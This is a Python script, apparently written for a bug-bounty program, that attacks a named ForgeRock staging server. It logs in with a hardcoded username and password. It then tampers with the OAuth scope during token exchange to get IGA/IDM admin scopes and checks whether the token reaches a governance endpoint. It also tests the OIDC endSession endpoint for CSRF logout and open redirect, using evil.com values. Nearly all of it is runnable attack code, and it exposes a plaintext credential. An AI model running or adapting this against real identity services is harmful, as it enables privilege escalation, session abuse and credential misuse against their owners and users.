# -*- coding: utf-8 -*-
"""AIC 第三十一轮:怀疑一切重启——单点打透:token 阶段 scope 篡改
承诺(OAuth2 RFC 6749):access_token 请求的 scope 必须等于 authorize 阶段授予的 scope,
   即"授权时给了什么,交换时只能要什么"。
反例:code 用 scope=openid 获取,交换时把 scope 篡改为 openid fr:iga:* fr:idm:*
   ——若承诺 X 成立,输入 Y(篡改 scope)就不该有结果 Z(高权限 token)。
预期结果表:
   成立 -> 交换 200 且 JWT scope 含 fr:iga:* 且带 token 访问 IGA grants 200(漏洞实锤)
   不成立 -> 交换 400 invalid_scope,或 200 但 token scope 仍为 openid(承诺成立,换下一个反例)
附带 C 面:endSession(OIDC 端点,从未测过)是否接受 GET/无 Origin 校验(CSRF logout 面),
   放最后执行(会登出本会话,属预期副作用,测完收工)。
"""
import requests, urllib3, json, base64, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK:', COOKIE_NAME + '=' + tok[:24] + '...')

def get_code(scope='openid'):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
        '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
    print('  authorize[%s] -> %d%s' % (scope, r.status_code, ' code=' + code[:20] if code else ' ' + r.text[:80]))
    return code

def exchange(code, scope_param=None):
    data = {'grant_type': 'authorization_code', 'code': code,
            'redirect_uri': RU, 'client_id': 'endUserUIClient'}
    if scope_param:
        data['scope'] = scope_param
    r = S.post(TOKEN_EP, data=data, headers=FORM, timeout=12, verify=False)
    print('  exchange scope=%s -> %d %s' % (scope_param or '(无)', r.status_code, r.text[:150].replace('\n', ' ')))
    if r.status_code == 200:
        j = r.json()
        at = j.get('access_token', '')
        # 解码 JWT payload 看 scope
        try:
            payload = json.loads(base64.urlsafe_b64decode(at.split('.')[1] + '=='))
            print('  JWT scope claim:', payload.get('scope'))
        except Exception:
            print('  (token 非 JWT,scope 字段:', j.get('scope'), ')')
        return at, j.get('scope')
    return None, None

def iga_probe(at, label):
    h = {'Authorization': 'Bearer ' + at, 'Accept-API-Version': 'resource=2.1, protocol=1.0'}
    try:
        r = S.get(BASE + '/iga/governance/user/%s/grants?grantType=role' % MY_ID,
                  headers=h, timeout=12, verify=False)
        print('  IGA grants [%s] -> %d %s' % (label, r.status_code, r.text[:100].replace('\n', ' ')))
    except Exception as e:
        print('  IGA grants [%s] -> ERR %s' % (label, str(e)[:60]))

print('\n=== A. token 阶段 scope 篡改 ===')
# 1) 基线:openid code 正常交换
c = get_code('openid')
at_base, sc_base = exchange(c)
if at_base:
    iga_probe(at_base, '基线 openid token')
    time.sleep(0.5)

# 2) 实验:openid code,交换时加高权限 scope
c = get_code('openid')
at_up, sc_up = exchange(c, 'openid fr:iga:* fr:idm:*')
if at_up:
    iga_probe(at_up, '篡改后 token')
    time.sleep(0.5)

# 3) 实验:全替换 scope(不带 openid)
c = get_code('openid')
at_up2, sc_up2 = exchange(c, 'fr:iga:*')

print('\n=== C. endSession CSRF/logout 面(最后执行,会登出会话) ===')
for extra, lab in [
    ('', 'GET 无参数'),
    ('?post_logout_redirect_uri=' + quote('https://evil.com', safe=''), 'GET + 外域跳转参数'),
]:
    try:
        r = S.get(BASE + '/am/oauth2/realms/alpha/connect/endSession' + extra,
                  timeout=12, verify=False, allow_redirects=False)
        print('GET endSession[%s] -> %d %s' % (lab, r.status_code,
              (r.headers.get('Location', '') or r.text[:100]).replace('\n', ' ')))
    except Exception as e:
        print('GET endSession[%s] -> ERR %s' % (lab, str(e)[:60]))
    time.sleep(0.5)
# 带 Origin 对照(合法来源)
r = S.get(BASE + '/am/oauth2/realms/alpha/connect/endSession',
          headers={'Origin': 'https://openam-bug-bounty-stag.forgeblocks.com'},
          timeout=12, verify=False, allow_redirects=False)
print('GET endSession[带合法Origin] -> %d %s' % (r.status_code, r.text[:100].replace('\n', ' ')))
# Referer 外域对照
r = S.get(BASE + '/am/oauth2/realms/alpha/connect/endSession',
          headers={'Referer': 'https://evil.com/x.html'},
          timeout=12, verify=False, allow_redirects=False)
print('GET endSession[外域Referer] -> %d %s' % (r.status_code, r.text[:100].replace('\n', ' ')))
